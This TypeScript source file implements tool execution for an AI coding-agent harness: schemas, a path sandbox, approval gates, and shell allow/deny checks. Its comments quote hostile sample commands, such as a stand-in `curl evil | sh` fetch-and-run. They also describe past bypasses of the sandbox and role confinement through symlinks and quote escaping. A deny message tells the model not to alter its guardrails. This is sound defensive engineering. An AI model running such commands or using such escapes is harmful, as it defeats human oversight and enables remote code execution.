/**
 * gnomon-core: Tool execution
 *
 * The declared tools in .gnomon/tools.toml, made real: schemas for the model,
 * an executor, a sandbox, and an approval gate.
 *
 * Outcome codes follow conformance/exit_codes.json, so a tool result maps to a
 * bucket the same way a process exit code does:
 *   0      result              — the tool ran
 *   2/3/4  refusal             — denied, out of sandbox, or not declared
 *   11     apparatus_failure   — the tool broke
 *
 * No dependencies.
 */

import { spawn } from "node:child_process";
import {
  readFileSync,
  writeFileSync,
  existsSync,
  statSync,
  readdirSync,
  realpathSync,
  Dirent,
  Stats,
  mkdirSync,
  lstatSync,
  readlinkSync
} from "node:fs";
import { resolve, relative, isAbsolute, dirname, join, sep } from "node:path";
import { createHash } from "node:crypto";
import { lookup as dnsLookupCb } from "node:dns";
import { promisify } from "node:util";
import {
  GnomonConfig,
  declaredTools,
  isToolEnabled,
  recomputeManifest,
} from "./config.js";
import { proposeSkill, renderSkill, SkillProposal } from "./skills.js";
import { compute, ComputeError } from "./compute.js";
import type { McpRegistry, McpToolInfo } from "./mcp.js";

// ---------------------------------------------------------------------------
// Outcome codes
// ---------------------------------------------------------------------------

export const TOOL_OK = 0;
/** The tool ran and the answer was negative (missing path). Still a result. */
export const TOOL_OK_EMPTY = 1;
export const TOOL_DENIED = 2;
export const TOOL_OUT_OF_SANDBOX = 3;
export const TOOL_NOT_DECLARED = 4;
export const TOOL_FAILED = 11;

export interface ToolOutcome {
  /** Maps to a bucket via conformance/exit_codes.json */
  code: number;
  /** What goes back to the model as the tool message */
  content: string;
  /** One line for the transcript */
  summary: string;
  /**
   * Set when `.gnomon/` moved while this call ran. Only `bash` can do this —
   * `write` and `edit` refuse the surface outright — and it is reported rather
   * than prevented because the command is arbitrary shell.
   */
  surface_drift?: SurfaceDrift;
  /**
   * Set when the worktree moved while this call ran. Only `bash` reports it,
   * and only observationally — the tree is stamped before and after, never
   * inferred from the command text.
   *
   * Deliberately NOT folded into `touchedFiles`/`verify.after`. Those are a
   * published enumeration (`"write" | "always"`), and since bash is enabled by
   * default, treating shell mutation as a write would collapse `"write"` into
   * `"always"` for any turn that ever shelled out — widening a declared value
   * without declaring it. This exists so the anti-flailing nudge can tell work
   * from idling; the verify gate keeps its own, narrower meaning.
   */
  worktree_changed?: boolean;
}

// ---------------------------------------------------------------------------
// Schemas
// ---------------------------------------------------------------------------

export interface ToolSchema {
  type: "function";
  function: {
    name: string;
    description: string;
    parameters: Record<string, unknown>;
  };
}

const obj = (
  props: Record<string, unknown>,
  required: string[]
): Record<string, unknown> => ({ type: "object", properties: props, required });

const str = (description: string) => ({ type: "string", description });

/** Parameter schemas for the tools this build implements. */
const IMPLEMENTED: Record<string, Record<string, unknown>> = {
  read: obj(
    {
      path: str("File or directory path, relative to the repository root"),
    },
    ["path"]
  ),
  bash: obj({ command: str("Shell command to run") }, ["command"]),
  task: obj(
    {
      role: str(
        "Role the sub-turn runs as. It gets that role's tools, not yours."
      ),
      instruction: str(
        "Everything the sub-turn needs. It starts with no history and cannot " +
          "see this conversation."
      ),
    },
    ["role", "instruction"]
  ),
  webfetch: obj(
    {
      url: str("Absolute http or https URL to retrieve as text"),
    },
    ["url"]
  ),
  note: obj(
    {
      text: str(
        "One short fact this run learned — what you tried, what failed, what " +
          "not to repeat. Later steps see it, including after compaction."
      ),
    },
    ["text"]
  ),
  todo: {
    type: "object",
    properties: {
      todos: {
        type: "array",
        description:
          "The complete checklist, replacing the previous one. Send every " +
          "item each time, not just the changed ones.",
        items: {
          type: "object",
          properties: {
            content: str("What the step is, in a few words"),
            status: {
              type: "string",
              enum: ["pending", "in_progress", "completed"],
              description: "At most one item may be in_progress.",
            },
          },
          required: ["content", "status"],
        },
      },
    },
    required: ["todos"],
    additionalProperties: false,
  },
  compute: obj(
    {
      expression: str(
        "Arithmetic to evaluate exactly, e.g. `19.99 * 3` or " +
          "`round(1234 / 7, 2)`. Operators + - * / % ^ and the functions " +
          "sqrt, abs, round, floor, ceil, min, max."
      ),
    },
    ["expression"]
  ),
  glob: obj(
    {
      pattern: str(
        "Glob over the path, e.g. `**/*.ts`, `src/**/test_*.py`. `*` stops " +
          "at a separator, `**` crosses them."
      ),
      path: str("Directory to search under, relative to the root. Default: the root."),
    },
    ["pattern"]
  ),
  grep: obj(
    {
      pattern: str("Regular expression to match against each line"),
      path: str("Directory to search under, relative to the root. Default: the root."),
      include: str("Only search files whose path matches this glob, e.g. `**/*.rs`"),
      ignore_case: {
        type: "boolean",
        description: "Match case-insensitively. Default: false.",
      },
    },
    ["pattern"]
  ),
  write: obj(
    {
      path: str("File path, relative to the repository root"),
      content: str("Full file contents to write"),
    },
    ["path", "content"]
  ),
  edit: obj(
    {
      path: str("File path, relative to the repository root"),
      old_text: str("Exact text to replace. Must appear exactly once."),
      new_text: str("Replacement text"),
    },
    ["path", "old_text", "new_text"]
  ),
  skill: obj(
    {
      name: str("Short name for the skill, e.g. 'rust test layout'"),
      body: str(
        "The instruction itself: what someone working in this repository " +
          "should know or do. Concrete and specific to this repository."
      ),
      description: str("One line summarising when this applies"),
      match: str(
        "Optional case-insensitive regular expression. The skill is loaded " +
          "only for turns whose input matches. Omit to always apply."
      ),
      roles: {
        type: "array",
        items: { type: "string" },
        description: "Roles this applies to. Omit for all roles.",
      },
    },
    ["name", "body"]
  ),
};

export interface ToolSet {
  schemas: ToolSchema[];
  /**
   * MCP servers the surface declares.
   *
   * The names of MCP servers the surface declares (wired by connectMcp /
   * ctx.mcp). Their discovered tools are merged into `schemas` when connected;
   * this list is what the startup summary counts, and what names a server whose
   * tools are absent because it did not connect — never silently dropped.
   */
  mcp_declared: string[];
  /** Declared but switched off in the surface */
  disabled: string[];
  /** Declared and enabled, but not implemented by this build */
  unimplemented: string[];
  /** Enabled, but not in this role's allow-list */
  withheld: string[];
}

/**
 * Build the tool schemas sent to the model.
 *
 * A declared tool that cannot be offered is named in `disabled` or
 * `unimplemented` rather than quietly left out: system.md forbids silently
 * shortening the tool list.
 */
export function buildToolSet(
  config: GnomonConfig,
  role?: string,
  mcpTools: McpToolInfo[] = []
): ToolSet {
  const schemas: ToolSchema[] = [];
  const disabled: string[] = [];
  const unimplemented: string[] = [];
  const withheld: string[] = [];

  // A role may narrow the tool list. Absent means "everything declared";
  // an empty list means none, which is how a verifier that runs the suite
  // but must not write is expressed.
  const allowed = role ? config.roles[role]?.tools : undefined;
  const roleLimited = Array.isArray(allowed);

  for (const tool of declaredTools(config)) {
    if (roleLimited && !allowed!.includes(tool.name)) {
      withheld.push(tool.name);
      continue;
    }
    if (!isToolEnabled(config, tool.name)) {
      disabled.push(tool.name);
      continue;
    }
    const parameters = IMPLEMENTED[tool.name];
    if (!parameters) {
      unimplemented.push(tool.name);
      continue;
    }
    schemas.push({
      type: "function",
      function: {
        name: tool.name,
        description: tool.description ?? tool.name,
        parameters,
      },
    });
  }

  // MCP tools discovered from connected servers. Gated like any other tool: a
  // role with a `tools` list must name the tool, or its server (`mcp__<server>`)
  // to take all of that server's tools.
  for (const mt of mcpTools) {
    const serverKey = `mcp__${mt.server}`;
    if (roleLimited && !allowed!.includes(mt.name) && !allowed!.includes(serverKey)) {
      withheld.push(mt.name);
      continue;
    }
    schemas.push({
      type: "function",
      function: {
        name: mt.name,
        description: mt.description ?? mt.name,
        parameters: mt.inputSchema as Record<string, unknown>,
      },
    });
  }

  const mcp = (config.tools.mcp_servers ?? {}) as Record<string, unknown>;
  return {
    schemas,
    disabled,
    unimplemented,
    withheld,
    mcp_declared: Object.keys(mcp),
  };
}

// ---------------------------------------------------------------------------
// Sandbox
// ---------------------------------------------------------------------------

export type SandboxLevel = "off" | "confined" | "strict";

/**
 * Resolve a model-supplied path inside the repository root.
 *
 * Returns null when the path escapes the root under confined/strict. The check
 * is on the *resolved* path, so `../` and absolute paths are both caught.
 */
export function resolveInRoot(
  root: string,
  path: string,
  sandbox: SandboxLevel
): string | null {
  const abs = isAbsolute(path) ? resolve(path) : resolve(root, path);
  if (sandbox === "off") return abs;

  // Compare real paths, not written ones. `resolve()` is pure string algebra:
  // it collapses `..` and nothing else, so a symlink inside the repository
  // pointing anywhere on the filesystem passed this check untouched. That was
  // a full escape in both directions — `read link-to-outside.txt` returned a
  // file the repository does not contain, and `write linked-dir/f` created one
  // outside the root while sandbox was set to "confined".
  //
  // The root is realpath'd too, so a checkout reached through a symlinked
  // parent (a home directory on another volume, a /tmp that is really
  // /private/tmp) still resolves to itself rather than looking like an escape.
  const realRoot = realpathOrSelf(resolve(root));
  const realAbs = realpathOfNearest(abs);
  const rel = relative(realRoot, realAbs);
  if (rel.startsWith("..") || isAbsolute(rel)) return null;
  return abs;
}

/** realpath, falling back to the path itself when it does not exist yet. */
function realpathOrSelf(p: string): string {
  try {
    return realpathSync(p);
  } catch {
    return p;
  }
}

/**
 * Real path of `abs`, resolving whatever part of it already exists.
 *
 * A write names a file that is usually absent, so `realpathSync` on it throws
 * and would leave the check with nothing to compare. Walking up to the
 * nearest existing ancestor and re-attaching the remainder resolves every
 * symlink on the path that could redirect the write, which is the part that
 * matters — the final component cannot itself be a symlink if it does not
 * exist.
 */
function realpathOfNearest(abs: string): string {
  const parts: string[] = [];
  let cur = abs;
  for (let i = 0; i < 64; i++) {
    // A DANGLING symlink makes realpathSync throw, and the fallback below then
    // returns the lexical path — so `src/link.txt -> ../../escaped.txt` looked
    // like it lived in src/ to every guard built on this, write_allow included.
    // Resolve the link by hand before giving up on it: a link that does not
    // point anywhere yet still decides where the write lands.
    try {
      if (lstatSync(cur).isSymbolicLink()) {
        const target = resolve(dirname(cur), readlinkSync(cur));
        // Guard the recursion the same way the loop is guarded.
        const resolved = i < 32 ? realpathOfNearest(target) : target;
        return parts.length > 0 ? join(resolved, ...parts) : resolved;
      }
    } catch {
      /* not a link, or unreadable — fall through to the ordinary path */
    }
    try {
      return parts.length > 0 ? join(realpathSync(cur), ...parts) : realpathSync(cur);
    } catch {
      const parent = dirname(cur);
      if (parent === cur) return abs; // reached the filesystem root
      parts.unshift(cur.slice(parent.length + 1));
      cur = parent;
    }
  }
  return abs;
}

// ---------------------------------------------------------------------------
// Approval
// ---------------------------------------------------------------------------

export type ApprovalGate = "never" | "on_write" | "always";

/** A pending tool call awaiting the user's decision. */
export interface ApprovalRequest {
  tool: string;
  /** One-line description, e.g. `write src/x.ts (+12 −3)` */
  summary: string;
  /** Multi-line preview: a diff, or the command about to run */
  preview: string[];
}

export type Approver = (req: ApprovalRequest) => Promise<boolean>;

/**
 * Whether the agent may edit its own `.gnomon/` surface this session, set by
 * the human via `/allow`. `strict` (default) keeps the surface a human-only
 * act — the pillar. `custom` lets the agent write it but each edit is approved;
 * `all` is standing consent. A consented surface write still moves the hash
 * loudly, so the change stays auditable. Never set by the agent itself.
 */
export type SurfaceConsent = "strict" | "custom" | "all";

/** Tools that can change something outside the model's own context. */
const MUTATING = new Set(["bash", "write", "edit", "skill", "webfetch", "task"]);

/** Whether a call needs sign-off under the configured gate. */
/**
 * Whether a call needs sign-off under the configured gate.
 *
 * The three gates are the three ways to run the loop:
 *
 *   always   — every tool call asks, reads and searches included. Consent
 *              after every action.
 *   on_write — only calls that can change something ask. Consent per change.
 *   never    — nothing asks. Unattended.
 *
 * Every tool must consult this, not only the mutating ones. `always` used to
 * be reached exclusively from `bash`, `write`, `edit` and `skill`, which are
 * the same four `on_write` stops — so the two settings behaved identically and
 * `always` was a documented dial that turned nothing. policy.toml already says
 * what that is worth: a surface documenting a setting no code reads is worse
 * than one that omits it, because it invites you to tune something that
 * cannot move.
 */
export function needsApproval(tool: string, gate: ApprovalGate): boolean {
  if (gate === "always") return true;
  if (gate === "never") return false;
  // on_write: bash is included because a command can write anything.
  return MUTATING.has(tool);
}

/**
 * Ask for a read-only call, when the gate is strict enough to want one.
 *
 * Returns null when the call may proceed, or the refusal to hand back. Reads
 * and searches share this because under `always` the reason to stop is the
 * same for all of them, and it is not that they might change something.
 */
async function gateReadOnly(
  tool: string,
  summary: string,
  ctx: ToolContext,
  preview: string[] = []
): Promise<ToolOutcome | null> {
  if (!needsApproval(tool, ctx.gate)) return null;
  const ok = await ctx.approve({ tool, summary, preview });
  if (ok) return null;
  return {
    code: TOOL_DENIED,
    content: `Refused: the user declined the ${tool} call.`,
    summary: `${summary} — denied`,
  };
}

// ---------------------------------------------------------------------------
// Shell command inspection
// ---------------------------------------------------------------------------

/** What a shell command is made of, as far as an allow-list must care. */
export interface ShellScan {
  /** Top-level commands, split on unquoted `;` `&&` `||` `|` `&` and newline */
  segments: string[];
  /** `$(...)`, backticks, or process substitution appears outside quotes */
  substitution: boolean;
  /** Output redirection appears outside quotes */
  redirection: boolean;
}

/**
 * Take a shell command apart, honouring quotes.
 *
 * An allow-list that tests the whole string is not an allow-list. Matching
 * `^ls\s` against `ls /tmp; echo pwned > f` succeeds, and the shell then runs
 * both halves — which is exactly how a role with no write tool wrote a file.
 * Every top-level segment has to clear the list on its own, and a `;` inside
 * `grep "a;b"` must not be mistaken for one.
 */
export function scanShellCommand(command: string): ShellScan {
  const segments: string[] = [];
  let current = "";
  let quote: '"' | "'" | null = null;
  let substitution = false;
  let redirection = false;

  const push = () => {
    const t = current.trim();
    if (t) segments.push(t);
    current = "";
  };

  for (let i = 0; i < command.length; i++) {
    const ch = command[i];
    const next = command[i + 1];

    if (quote) {
      // Single quotes take everything literally; double quotes still expand,
      // so a substitution inside them is real.
      if (quote === '"' && ((ch === "$" && next === "(") || ch === "`")) {
        substitution = true;
      }
      // A single-quoted string ends at the very next quote — bash never lets
      // a backslash escape it; only inside double quotes does `\"` stay
      // literal. Applying the backslash test to single quotes let `'x\'` read
      // as an open quote, swallowing the `; curl … | sh` tail into one segment
      // that an allow-listed prefix then waved through.
      if (ch === quote && (quote === "'" || command[i - 1] !== "\\")) quote = null;
      current += ch;
      continue;
    }

    // Outside any quote, a backslash escapes the next character — bash reads
    // `\'`, `\"`, `\;`, `\|`, `\>`, `\$` as the literal character. Consume both
    // here so the escaped char can neither open a quote nor be mistaken for a
    // separator. Without this, `cat x \'; curl evil | sh` had its `\'` open a
    // quote bash never opened, swallowing the whole `; curl … | sh` tail into
    // one segment that an allow-listed `^cat` prefix then waved through — the
    // per-role bash confinement, defeated by two characters.
    if (ch === "\\") {
      current += ch + (next ?? "");
      i++;
      continue;
    }

    if (ch === '"' || ch === "'") {
      quote = ch;
      current += ch;
      continue;
    }

    if (ch === "`" || (ch === "$" && next === "(")) {
      substitution = true;
      current += ch;
      continue;
    }
    // Process substitution: <(cmd) and >(cmd) both run a command.
    if ((ch === "<" || ch === ">") && next === "(") {
      substitution = true;
      current += ch;
      continue;
    }
    if (ch === ">") {
      redirection = true;
      current += ch;
      continue;
    }

    if (ch === ";" || ch === "\n") {
      push();
      continue;
    }
    if ((ch === "&" || ch === "|") && next === ch) {
      push();
      i++;
      continue;
    }
    if (ch === "|" || ch === "&") {
      push();
      continue;
    }

    current += ch;
  }
  push();

  return { segments, substitution, redirection };
}

// ---------------------------------------------------------------------------
// Diff preview
// ---------------------------------------------------------------------------

/**
 * Largest LCS table this will allocate: ~2M cells, about 16MB as a dense
 * number[][], which is a size a long-running session can absorb repeatedly.
 * Roughly 1400x1400 lines.
 */
export const LCS_CELL_CAP = 2_000_000;

/** Marks a diff whose preview was skipped; carries the real counts for diffStat. */
export const DIFF_ELIDED = "  … diff preview elided:";

/**
 * What changed, for a pair too large to diff cell-by-cell.
 *
 * Deliberately honest about being a summary: a reviewer who is shown "+3 −1"
 * for a 40 000-line rewrite has been misled, so this says outright that the
 * preview was elided and how big the two sides are.
 */
function summariseDiff(a: string[], b: string[]): string[] {
  const sample = 12;
  // The counts ride in the marker so diffStat stays truthful. Without this the
  // sampled lines are all it can see, and a 40 000-line rewrite reports "+12
  // −12" — a reviewer shown that has been actively misled, which is worse than
  // being told the preview was skipped.
  const out: string[] = [
    `${DIFF_ELIDED} ${a.length} lines → ${b.length} lines is too large to diff ` +
      `line-by-line; showing the first ${sample} of each side. removed=${a.length} added=${b.length}`,
  ];
  for (const line of a.slice(0, sample)) out.push(`- ${line}`);
  if (a.length > sample) out.push(`  … ${a.length - sample} more removed`);
  for (const line of b.slice(0, sample)) out.push(`+ ${line}`);
  if (b.length > sample) out.push(`  … ${b.length - sample} more added`);
  return out;
}

/** Longest-common-subsequence line diff, rendered as +/- lines. */
export function diffLines(before: string, after: string, context = 3): string[] {
  const a = before.length ? before.split("\n") : [];
  const b = after.length ? after.split("\n") : [];

  // "Files here are small enough that O(n·m) is fine" was the standing comment,
  // and it is true right up until a model overwrites a lockfile, a generated
  // file or a dataset. Measured: 6 000 lines cost 371MB, 12 000 cost 866MB, and
  // 40 000 killed the process outright with a V8 heap OOM -- exit 134, SIGABRT.
  //
  // That is the worst failure this harness can have. The try/catch in
  // executeTool cannot catch a V8 OOM, so nothing is emitted: no exit-contract
  // code, no session snapshot, no session_end record. Rule 5 promises a
  // published exit contract and an ordinary `write` walked straight past it,
  // taking the audit trail's seal with it.
  //
  // Above the cap, say what changed instead of computing where. The approval
  // preview truncates at 60 lines regardless, so no caller loses anything it
  // was actually going to show.
  if ((a.length + 1) * (b.length + 1) > LCS_CELL_CAP) {
    return summariseDiff(a, b);
  }
  const lcs: number[][] = Array.from({ length: a.length + 1 }, () =>
    new Array(b.length + 1).fill(0)
  );
  for (let i = a.length - 1; i >= 0; i--) {
    for (let j = b.length - 1; j >= 0; j--) {
      lcs[i][j] =
        a[i] === b[j] ? lcs[i + 1][j + 1] + 1 : Math.max(lcs[i + 1][j], lcs[i][j + 1]);
    }
  }

  const marked: Array<{ sign: " " | "+" | "-"; text: string }> = [];
  let i = 0;
  let j = 0;
  while (i < a.length && j < b.length) {
    if (a[i] === b[j]) {
      marked.push({ sign: " ", text: a[i] });
      i++;
      j++;
    } else if (lcs[i + 1][j] >= lcs[i][j + 1]) {
      marked.push({ sign: "-", text: a[i++] });
    } else {
      marked.push({ sign: "+", text: b[j++] });
    }
  }
  while (i < a.length) marked.push({ sign: "-", text: a[i++] });
  while (j < b.length) marked.push({ sign: "+", text: b[j++] });

  // Keep only `context` unchanged lines around each change.
  const keep = new Array(marked.length).fill(false);
  marked.forEach((m, k) => {
    if (m.sign === " ") return;
    for (let x = Math.max(0, k - context); x <= Math.min(marked.length - 1, k + context); x++) {
      keep[x] = true;
    }
  });

  const out: string[] = [];
  let skipping = false;
  marked.forEach((m, k) => {
    if (keep[k]) {
      out.push(`${m.sign} ${m.text}`);
      skipping = false;
    } else if (!skipping) {
      out.push("  …");
      skipping = true;
    }
  });
  return out;
}

/** `+n −m` counts for a diff. */
export function diffStat(lines: string[]): { added: number; removed: number } {
  // An elided preview carries the true totals, because the handful of sampled
  // lines it shows are not what changed.
  const elided = lines[0]?.startsWith(DIFF_ELIDED)
    ? /removed=(\d+) added=(\d+)/.exec(lines[0])
    : null;
  if (elided) {
    return { added: Number(elided[2]), removed: Number(elided[1]) };
  }
  return {
    added: lines.filter((l) => l.startsWith("+ ")).length,
    removed: lines.filter((l) => l.startsWith("- ")).length,
  };
}

// ---------------------------------------------------------------------------
// Execution
// ---------------------------------------------------------------------------

export interface ToolContext {
  /** Needed by `skill`, which writes inside .gnomon/ */
  config?: GnomonConfig;
  /**
   * Shell commands the current role may run. Empty/undefined means any.
   * See RoleDef.bash_allow: without this, granting `bash` grants writing.
   */
  bashAllow?: string[];
  /**
   * Shell commands the current role may never run, whatever else allows them.
   *
   * See RoleDef.bash_deny. This is the list for the handful of operations
   * whose damage is not local and not undoable by re-running something —
   * force-pushing a release branch, deleting it on the remote. The role doing
   * the work has unrestricted bash by necessity; this is how it still cannot
   * do those.
   */
  bashDeny?: string[];
  /**
   * Paths this role may create or modify, as globs. Empty/undefined means any
   * path inside the sandbox.
   *
   * See RoleDef.write_allow. The `tools` list decides *whether* a role can
   * write; this decides *where*. A coordinator described as writing specs and
   * never source needs this, because withholding `edit` only stops it from
   * revising a file in place — `write` will happily create src/main.rs.
   */
  writeAllow?: string[];
  root: string;
  sandbox: SandboxLevel;
  gate: ApprovalGate;
  approve: Approver;
  /** bash timeout, ms */
  timeoutMs: number;
  /** Cap on bytes returned to the model from read/bash */
  maxOutputBytes: number;
  /**
   * The session checklist `todo` reads and replaces.
   *
   * Supplied by the loop, which owns session state. Absent means the tool is
   * unavailable rather than silently forgetful — a checklist that accepted
   * writes and dropped them would be worse than no checklist.
   */
  todos?: TodoStore;
  /**
   * Runs a sub-turn under another role, for the `task` tool. Supplied by the
   * loop, because a tool cannot call the model by itself.
   */
  delegate?: Delegate;
  /** Whether tools may reach the network. From `[sandbox] network`. */
  network?: boolean;
  /**
   * Whether the agent may write inside `.gnomon/` this session. Absent =
   * `strict` = the surface is human-only (the default, and the pillar).
   * `custom` permits a surface write with per-edit approval; `all` is standing
   * consent. Set by the human with `/allow`, never by the agent.
   */
  allow?: SurfaceConsent;
  /**
   * Connected MCP servers, if any. `mcp__…` tool calls route here. Supplied by
   * the loop, which owns the server processes' lifetime.
   */
  mcp?: McpRegistry;
  /**
   * Commands that already hit the bash timeout this turn.
   *
   * Both the tool description and the timeout message tell the model to detach
   * a long command and poll it. It does not: the measured long tail is a model
   * re-running the same blocking command until the wall, at full timeout cost
   * each time. This harness's own pillar is capability over instruction, and
   * two rounds of instruction is the evidence that prose was the wrong lever.
   *
   * Supplied by the loop, which owns turn-scoped state.
   */
  timedOutCommands?: Set<string>;
  /**
   * Cancellation for the running turn.
   *
   * Esc and Ctrl-C were only ever checked BETWEEN tool calls, so a command that
   * had already started could not be interrupted at all: the operator's only
   * exits were the tool timeout or killing the terminal. On a 120s default that
   * is two minutes of an unstoppable command they have already asked to stop --
   * and `detached: true` puts it in its own process group, so the terminal's
   * own Ctrl-C does not reach it either.
   */
  signal?: AbortSignal;
  /**
   * The run's scratch notes. Supplied by the loop, which owns session state.
   * Absent means the tool is unavailable rather than silently forgetful.
   */
  notes?: NoteStore;
}

/** One thing the run learned about itself, written by the model as it worked. */
export interface RunNote {
  /** Turn the note was written on, for ordering and for the audit record. */
  turn: number;
  text: string;
}

/**
 * The run's own notes: what has been tried, what did not work, what to avoid.
 *
 * DESIGN.md forbids an agent rewriting its own SKILLS mid-session, because that
 * would change the surface hash underneath the run that changed it. That
 * argument is correct and this does not violate it: notes live outside the
 * surface, exactly as `.gnomon-sessions/` and `.gnomon-audit/` already do, for
 * exactly the same reason. They are read back as observation, never as
 * instruction, and they cannot grant a capability the surface withheld.
 *
 * Without this the harness is amnesiac inside a single run -- which is why its
 * measured long tail was repeating an action that had already failed.
 */
export interface NoteStore {
  list(): RunNote[];
  add(text: string): void;
}

/** One item on the session checklist. */
export interface Todo {
  content: string;
  status: TodoStatus;
}

export type TodoStatus = "pending" | "in_progress" | "completed";

/** Where the checklist lives. The loop owns it; the tool only edits it. */
export interface TodoStore {
  list(): Todo[];
  replace(todos: Todo[]): void;
}

/** What `task` needs from the loop to run a sub-turn. */
export interface Delegate {
  /** Roles a sub-turn may be given. */
  roles(): string[];
  /** Run `instruction` as `role`, with no history, and return its answer. */
  run(role: string, instruction: string): Promise<DelegateResult>;
  /** How deep the current turn already is. 0 is the top-level turn. */
  depth: number;
}

export interface DelegateResult {
  content: string;
  code: number;
  toolSteps: number;
  model: string;
}

function clamp(text: string, limit: number): string {
  if (text.length <= limit) return text;
  return (
    `${text.slice(0, limit)}\n… [truncated at ${limit} bytes — this is the start of the output, not all of it. Repeating the call returns the same prefix: narrow it instead, with grep, a subpath, or a filtered command.]`
  );
}

/**
 * Keep both ends of an output that is too long, and say how much went missing.
 *
 * `clamp` keeps the head, which is right when the model can narrow the call and
 * try again. A killed command cannot be narrowed and re-run cheaply — and the
 * part that says *why* it was still running is usually the last thing it
 * printed. So a timeout keeps the tail as well, and names the dropped byte
 * count rather than eliding silently.
 */
function clampEnds(text: string, limit: number): string {
  if (text.length <= limit) return text;
  const head = Math.floor(limit * 0.6);
  const tail = limit - head;
  const dropped = text.length - limit;
  return (
    `${text.slice(0, head)}\n… [${dropped} bytes dropped from the middle — this is the start and the end of the output, not all of it.]\n${text.slice(-tail)}`
  );
}

async function readTool(
  args: Record<string, unknown>,
  ctx: ToolContext
): Promise<ToolOutcome> {
  // A missing, empty or non-string path resolved to "" and then to the
  // FILESYSTEM ROOT — `read / — 1 entries` — rather than being refused. The
  // model asked for nothing and got a listing of somewhere it never named.
  if (typeof args.path !== "string" || args.path.trim() === "") {
    return {
      code: TOOL_DENIED,
      content: `Refused: read needs a \`path\`. Nothing was given, and an absent path is not a path.`,
      summary: `read — no path given`,
    };
  }
  const path = args.path;
  const abs = resolveInRoot(ctx.root, path, ctx.sandbox);
  if (!abs) {
    return {
      code: TOOL_OUT_OF_SANDBOX,
      content: `Refused: "${path}" is outside the repository root and sandbox=${ctx.sandbox}.`,
      summary: `read ${path} — refused (outside sandbox)`,
    };
  }
  if (!existsSync(abs)) {
    // The tool worked and the answer is "it isn't there". That is a result,
    // not an apparatus failure — exploring a tree turns up missing paths
    // constantly, and marking each one as broken apparatus makes the bucket
    // meaningless.
    return {
      code: TOOL_OK_EMPTY,
      content: `No such file or directory: ${path}`,
      summary: `read ${path} — not found`,
    };
  }
  const denied = await gateReadOnly("read", `read ${path}`, ctx);
  if (denied) return denied;

  try {
    if (statSync(abs).isDirectory()) {
      const entries = readdirSync(abs, { withFileTypes: true })
        .filter((e) => e.name !== "node_modules" && e.name !== ".git")
        .map((e) => (e.isDirectory() ? `${e.name}/` : e.name))
        .sort();
      return {
        code: TOOL_OK,
        content: entries.join("\n") || "(empty directory)",
        summary: `read ${path.replace(/\/+$/, "")}/ — ${entries.length} entries`,
      };
    }
    const raw = readFileSync(abs, "utf-8");
    const numbered = raw
      .split("\n")
      .map((l, n) => `${String(n + 1).padStart(5)}\t${l}`)
      .join("\n");
    return {
      code: TOOL_OK,
      content: clamp(numbered, ctx.maxOutputBytes),
      summary: `read ${path} — ${raw.split("\n").length} lines`,
    };
  } catch (err) {
    return {
      code: TOOL_FAILED,
      content: `Could not read ${path}: ${err instanceof Error ? err.message : String(err)}`,
      summary: `read ${path} — failed`,
    };
  }
}

/**
 * Kill a spawned shell and everything it started.
 *
 * With shell:true the direct child is `sh -c`, which is not what does the
 * work. Signalling the negated pid targets the whole process group, so a
 * timed-out command cannot leave a live orphan behind.
 */
function killTree(proc: { pid?: number; kill: (sig: NodeJS.Signals) => boolean }): void {
  if (typeof proc.pid === "number") {
    try {
      process.kill(-proc.pid, "SIGKILL");
      return;
    } catch {
      // group already gone, or no permission — fall through
    }
  }
  try {
    proc.kill("SIGKILL");
  } catch {
    // already exited
  }
}

async function bashTool(
  args: Record<string, unknown>,
  ctx: ToolContext
): Promise<ToolOutcome> {
  // String({}) is "[object Object]", which the shell dutifully tried to run
  // and reported as exit 127. A malformed call should be refused, not executed.
  // Only a NON-STRING is refused. An empty string is harmless -- the shell runs
  // nothing and exits 0 -- and a turn that recovers from one must not be stamped
  // a refusal, which is a contract this suite already pins.
  if (typeof args.command !== "string") {
    return {
      code: TOOL_DENIED,
      content:
        `Refused: bash needs a \`command\` string, and got ${
          Array.isArray(args.command) ? "an array" : typeof args.command
        }. String({}) is "[object Object]", which the shell would try to run.`,
      summary: `bash — command is not a string`,
    };
  }
  const command = args.command;
  if (!command.trim()) {
    return { code: TOOL_FAILED, content: "Empty command.", summary: "bash — empty" };
  }

  // Deny first, and independently of the allow-list.
  //
  // An allow-list cannot say "everything except three catastrophes". The role
  // that does the work needs unrestricted bash — it runs builds, installers
  // and test suites nobody can enumerate in advance — and that is exactly the
  // role you want stopped from force-pushing over a release branch. Those are
  // different questions, so they are different lists, and deny wins: a pattern
  // on both is denied.
  if (ctx.bashDeny && ctx.bashDeny.length > 0) {
    const scan = scanShellCommand(command);
    // The whole string as well as each segment. A segment split cannot see
    // `git push --force` written across a substitution, and denial is the one
    // place where matching too much is the safer error.
    const subjects = [command, ...scan.segments];
    for (const pattern of ctx.bashDeny) {
      let re: RegExp;
      try {
        // Case-sensitive, like bash_allow. Shell commands and flags are, and
        // folding case here does real damage: `git branch -D` discards an
        // unmerged branch while `-d` refuses to, and the two differ only by
        // case. An "i" flag turned the guardrail on the destructive form into
        // a block on the safe one.
        re = new RegExp(pattern);
      } catch {
        // A deny pattern that will not compile must fail closed, unlike an
        // allow pattern: the cost of refusing a safe command is an error
        // message, and the cost of running an unsafe one is a lost branch.
        return {
          code: TOOL_DENIED,
          content:
            `Refused: this role has a bash_deny pattern that is not a valid ` +
            `regular expression (${pattern}). Fix it in roles.toml — while it ` +
            `cannot be evaluated, bash is refused rather than allowed.`,
          summary: "bash — deny pattern will not compile",
        };
      }
      const hit = subjects.find((sub) => re.test(sub));
      if (hit !== undefined) {
        return {
          code: TOOL_DENIED,
          content:
            `Refused: "${hit.trim().slice(0, 80)}" matches a bash_deny pattern ` +
            `for this role (/${pattern}/).\n\n` +
            `This is a fixed guardrail, not a judgement about the command. ` +
            `Do not try to change it — .gnomon/ is not yours to edit. Reach ` +
            `the same goal another way, or say plainly that it cannot be ` +
            `done under this role.`,
          summary: `bash — denied by bash_deny (/${pattern}/)`,
        };
      }
    }
  }

  // A role may narrow bash to specific commands. Without this, `tools` alone
  // cannot make a role read-only: bash writes.
  if (ctx.bashAllow && ctx.bashAllow.length > 0) {
    const allowed = ctx.bashAllow;
    const listed = allowed.map((p) => `/${p}/`).join(", ");
    const refuse = (why: string) => ({
      code: TOOL_DENIED,
      content: `Refused: ${why}\nThis role may only run commands matching ${listed}.`,
      summary: `bash — not permitted for this role`,
    });

    const scan = scanShellCommand(command);

    // Command substitution runs a command the allow-list never sees.
    if (scan.substitution) {
      return refuse(
        "the command uses substitution ($(…), backticks, or <(…)), which runs " +
          "something this list cannot inspect."
      );
    }
